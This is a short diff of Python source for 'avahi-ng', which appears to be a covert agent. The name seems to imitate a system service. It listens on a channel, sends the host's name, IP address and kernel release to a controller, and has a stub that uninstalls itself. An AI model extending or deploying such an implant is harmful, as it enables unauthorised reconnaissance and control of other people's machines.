@@ -13,7 +13,7 @@ import bitarray
 import logging
 import os
 
-logging.basicConfig(level=logging.DEBUG)
+logging.basicConfig(level=logging.WARNING)
 logging.info("Starting avahi-ng...")
 rx = channel.Receiver()
 rx_thread = threading.Thread(target=rx.start)
@@ -53,14 +53,14 @@ def handle_ping():
 
 
 def send_info():
-    resp = platform.node()+" "+get_if_addr(conf.iface)+" "+platform.uname()["release"]
+    resp = platform.node()+" "+get_if_addr(conf.iface)+" "+platform.uname().release
     send(resp)
     pass
 
 
 def burn():
     # Uninstall agent
-    logging.error("Not yet implimented!")
+    logging.error("Burnit is not yet implemented!")
     pass
 
 
